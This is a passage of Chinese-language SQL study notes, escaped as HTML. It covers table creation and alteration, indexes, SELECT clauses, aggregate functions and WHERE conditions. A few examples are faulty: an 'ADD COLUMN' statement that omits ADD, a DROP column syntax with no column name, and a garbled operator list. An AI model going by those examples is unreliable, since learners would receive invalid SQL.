&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SET&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;SCHEMA&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;my_schema&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;CREATE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;TABLE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;my_table&lt;/span&gt; (
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e06c75&#34;&gt;id&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;INT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;PRIMARY&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;KEY&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e06c75&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;VARCHAR&lt;/span&gt;(&lt;span style=&#34;color:#d19a66&#34;&gt;100&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;my_table 将被创建在 my_schema 模式下&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;修改基本表&#34;&gt;修改基本表
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;同样的，修改表时想要指定模式里面的表，就使用“模式名.表名”的方式指定表名&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;增加新的属性列&#34;&gt;增加新的属性列
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;ALTER TABLE 表名 ADD 新列名 数据类型 完整性约束条件;&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg.向TAB1里增加时间列Time：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;ALTER&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;TABLE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;ADD&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Time&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;DATE&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当然，还能在ADD后面加上修饰词COLUMN，这样会更容易理解是在添加列，&lt;strong&gt;对功能没有影响&lt;/strong&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;ALTER&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;TABLE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;COLUMN&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Time&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;DATE&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                    &lt;span style=&#34;color:#56b6c2&#34;&gt;~~~~~~&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;增加列级完整性约束条件&#34;&gt;增加列级完整性约束条件
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;ALTER TABLE SC ADD 列级完整性约束条件;&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg.向TAB1里增加Grade列必须取唯一值的条件：（Grade必须要已经存在）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;ALTER&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;TABLE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;ADD&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;UNIQUE&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;增加表级完整性约束条件&#34;&gt;增加表级完整性约束条件
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;ALTER TABLE SC ADD 表级完整性约束条件;&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg.向TAB1里增加Ch为外码的条件，参照表是TAB2：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;ALTER&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;TABLE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;ADD&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;FOREIGN&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;KEY&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;Ch&lt;/span&gt;) &lt;span style=&#34;color:#c678dd&#34;&gt;REFERENCES&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;Ch&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;删除列&#34;&gt;删除列
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;ALTER TABLE 表名 DROP CASCADE;&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;级联&lt;/strong&gt;：引用了该列的其他对象（例如视图）一起删除&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;mark&gt;ALTER TABLE 表名 DROP RESTRICT;&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;限制&lt;/strong&gt;：若该列被其他对象引用，则拒绝删除&lt;/p&gt;
&lt;h4 id=&#34;删除指定的完整性约束条件&#34;&gt;删除指定的完整性约束条件
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;ALTER TABLE 表名 DROP CONSTRAINT 完整性约束名 CASCADE/RESTRICT;&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;修改列&#34;&gt;修改列
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;ALTER TABLE 表名 ALTER COLUMN 列名 数据类型;&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg.把Grade由INT型修改成字符型：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;ALTER&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;TABLE&lt;/span&gt; 表名 &lt;span style=&#34;color:#c678dd&#34;&gt;ALTER&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;COLUMN&lt;/span&gt; 列名 数据类型；
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;删除基本表&#34;&gt;删除基本表
&lt;/h3&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;DROP TABLE 表名 CASCADE;&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;级联&lt;/strong&gt;：把表相关的依赖对象（比如视图）一并删除&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;DROP TABLE 表名 RESTRICT;&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;限制&lt;/strong&gt;：如果此表被其他表依赖（外码）或者有视图等，拒绝被删除&lt;/p&gt;
&lt;h2 id=&#34;索引&#34;&gt;索引
&lt;/h2&gt;&lt;h3 id=&#34;建立索引&#34;&gt;建立索引
&lt;/h3&gt;&lt;h4 id=&#34;建立唯一索引&#34;&gt;建立唯一索引
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;CREATE UNIQUE INDEX 索引名 ON 表名(列名1 次序,列名n 次序);&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;唯一索引&lt;/strong&gt; 是关于&lt;strong&gt;数据值是否唯一&lt;/strong&gt;的，它强制数据的唯一性，并帮助快速查找特定值&lt;/p&gt;
&lt;p&gt;eg.为表TAB1按照学号升序和时间降序建立唯一的索引：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;CREATE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;UNIQUE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;INDEX&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;NewIndex&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;ON&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;ASC&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;Time&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;DESC&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;ASC&lt;/strong&gt;：asceding，&lt;strong&gt;升序&lt;/strong&gt;
&lt;strong&gt;DESC&lt;/strong&gt;：descending，&lt;strong&gt;降序&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;建立聚簇索引&#34;&gt;建立聚簇索引
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;CREATE CLUSTER INDEX 索引名 ON 表名(列名1 次序,列名n 次序);&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;聚簇索引&lt;/strong&gt; 是关于&lt;strong&gt;数据如何物理存储&lt;/strong&gt;的，它把数据和索引紧密地绑定在一起，让查找和范围查询非常快&lt;/p&gt;
&lt;h4 id=&#34;重命名索引&#34;&gt;重命名索引
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;ALTER INDEX 旧索引名 RENAME TO 新索引名;&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg.把TAB1表的NewIndex索引重命名为OldIndex：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;ALTER&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;INDEX&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;NewIndex&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;RENAME&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;TO&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;OldIndex&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;删除索引&#34;&gt;删除索引
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;DROP INDEX 索引名;&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;查询数据select语句&#34;&gt;查询数据&amp;ndash;SELECT语句
&lt;/h2&gt;&lt;h3 id=&#34;一般格式&#34;&gt;一般格式
&lt;/h3&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;SELECT ALL/DISTINCT 目标列表达式&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;FROM 表名/视图名&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;WHERE 条件表达式&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;GROUP BY 列名 HAVING 条件表达式&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;ORDER BY 列名 次序;&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;h3 id=&#34;select-目标列表达式&#34;&gt;SELECT 目标列表达式
&lt;/h3&gt;&lt;h4 id=&#34;查询指定的列&#34;&gt;查询指定的列
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;SELECT 列名1，列名n&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg.查询TAB1的Ch列和Nu列：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Ch&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;查询全部的列&#34;&gt;查询全部的列
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;SELECT *&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg.查询TAB1的全部记录：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;查询计算后的值&#34;&gt;查询计算后的值
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;SELECT 表达式&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;表达式可以是算术表达式（+、-&amp;hellip;)，字符串常量，函数等等&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg.查询TAB1里面所有Grade减去2的值：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;改变查询结果的列标题&#34;&gt;改变查询结果的列标题
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;SELECT 列名 别名&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg.查询TAB1里面的Ch列和Nu列，在结果里面使用Chinese和Num显示&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Ch&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Chinese&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;Number&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;去除查询结果的重复行&#34;&gt;去除查询结果的重复行
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;SELECT DISTINCT 列名&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果没有使用DISTINCT，默认为ALL&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;聚集函数&#34;&gt;聚集函数
&lt;/h3&gt;&lt;p&gt;&lt;span style=&#34;color:red;font-size:18px&#34;&gt;&lt;strong&gt;聚集函数只处理非空值&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:red;font-size:18px&#34;&gt;&lt;strong&gt;聚集函数只能用于SELECT语句和CROUP BY中的HAVING子句&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;统计元组个数&#34;&gt;统计元组个数
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;COUNT(*)&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;某个元组的一个或者部分取空值的时候，不影响统计结果&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg.查询TAB1里面的总数：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;COUNT&lt;/span&gt;(&lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;统计某一列值的个数&#34;&gt;统计某一列值的个数
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;COUNT(DISTINCT/ALL 列名)&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;指定DISTINCT会去重，NULL不计入总数&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;计算某一列值的平均数该列必须为数值型&#34;&gt;计算某一列值的平均数（该列必须为数值型）
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;AVG(DISTINCT/ALL 列名)&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg.查询TAB1里面的Grade平均值：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AVG&lt;/span&gt;(&lt;span style=&#34;color:#c678dd&#34;&gt;ALL&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;计算某一列值的总和该列必须为数值型&#34;&gt;计算某一列值的总和（该列必须为数值型）
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;SUM(DISTINCT/ALL 列名)&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;计算某一列值的最大值最小值&#34;&gt;计算某一列值的最大值/最小值
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;MAX/MIN(DISTINCT/ALL 列名)&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;where-条件表达式&#34;&gt;WHERE 条件表达式
&lt;/h3&gt;&lt;h4 id=&#34;比较大小&#34;&gt;比较大小
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;WHERE 列名 运算式&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;mark&gt;常用运算符：=	&amp;gt;	&amp;lt;	&amp;gt;=	&amp;lt;=	!=/&amp;lt;&amp;gt;	!&amp;gt;	!&amp;laquo;/mark&amp;gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg.查询TAB1里面所有三年级（Grade=3）的学生的姓名：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Ch&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;3&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;eg.查询TAB1里面所有学号2300开头学生（Nu&amp;gt;23000）的学生的年级：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;23000&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;确定范围&#34;&gt;确定范围
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;WHERE 列名 BETWEEN 最小值 AND 最大值&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
